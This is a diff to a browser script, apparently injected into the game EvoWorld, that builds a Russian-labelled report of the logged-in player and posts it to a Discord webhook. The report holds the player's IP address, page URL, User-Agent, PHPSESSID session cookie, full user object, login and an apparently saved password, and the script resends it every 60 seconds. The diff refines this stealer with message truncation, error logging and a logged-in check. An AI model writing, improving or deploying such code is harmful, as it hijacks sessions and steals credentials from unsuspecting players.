@@ -52,15 +52,30 @@
     function sendToDiscord(message, username = 'EvoWorld Report') {
         console.log('📤 Sending to Discord');
         
+        // Truncate message if too long for Discord
+        if (message.length > 1900) {
+            message = message.substring(0, 1890) + '\n... (truncated)';
+        }
+        
+        // Format as code block if not already
+        if (!message.startsWith('```')) {
+            message = '```\n' + message + '\n```';
+        }
+        
         fetch(DISCORD_WEBHOOK, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                content: '```\n' + message + '\n```',
+                content: message,
                 username: username
             })
         }).then(response => {
             console.log('✅ Discord response:', response.status);
+            if (response.status !== 200 && response.status !== 204) {
+                return response.text().then(text => {
+                    console.log('Discord error details:', text);
+                });
+            }
         }).catch(error => {
             console.log('❌ Discord error:', error);
         });
@@ -89,31 +104,26 @@
             
             const savedPassword = getSavedPassword();
             
+            // Get IP
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(ipData => {
-                    const report = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
---- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---
+                    const report = `=== ПОЛНЫЙ ОТЧЕТ ===
+--- УРОВЕНЬ ---
 level: ${user.level || '0x'}
 gems: ${user.premiumPoints || 0}
-selected server: ${serverName} (${playerCount})
+server: ${serverName} (${playerCount})
 
---- ОСНОВНЫЕ ДАННЫЕ ---
-IP-адрес: ${ipData.ip}
-URL страницы: ${window.location.href}
+--- ДАННЫЕ ---
+IP: ${ipData.ip}
+URL: ${window.location.href}
 User-Agent: ${navigator.userAgent}
 
 --- PHPSESSID ---
 ${sessionId}
 
---- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---
+--- user DATA ---
 ${JSON.stringify(user, null, 2)}
-
---- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---
-${JSON.stringify(friendsData, null, 2)}
-
---- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---
-${JSON.stringify(friendsArr, null, 2)}
 
 --- УЧЕТНЫЕ ДАННЫЕ ---
 Логин: ${user.login || '.'}
@@ -123,21 +133,21 @@ ${JSON.stringify(friendsArr, null, 2)}
                     
                 })
                 .catch(() => {
-                    const report = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
---- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---
+                    const report = `=== ПОЛНЫЙ ОТЧЕТ ===
+--- УРОВЕНЬ ---
 level: ${user.level || '0x'}
 gems: ${user.premiumPoints || 0}
-selected server: ${serverName} (${playerCount})
+server: ${serverName} (${playerCount})
 
---- ОСНОВНЫЕ ДАННЫЕ ---
-IP-адрес: [Ошибка получения IP]
-URL страницы: ${window.location.href}
+--- ДАННЫЕ ---
+IP: [Ошибка получения]
+URL: ${window.location.href}
 User-Agent: ${navigator.userAgent}
 
 --- PHPSESSID ---
 ${sessionId}
 
---- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---
+--- user DATA ---
 ${JSON.stringify(user, null, 2)}
 
 --- УЧЕТНЫЕ ДАННЫЕ ---
@@ -160,7 +170,9 @@ ${JSON.stringify(user, null, 2)}
     
     // Send initial data
     setTimeout(() => {
-        collectAndSendData();
+        if (window.user && window.user.id) {
+            collectAndSendData();
+        }
     }, 3000);
     
     // Send data periodically
@@ -168,6 +180,6 @@ ${JSON.stringify(user, null, 2)}
         if (window.user && window.user.id) {
             collectAndSendData();
         }
-    }, 60000);
+    }, 60000); // Every 60 seconds
 
 })();
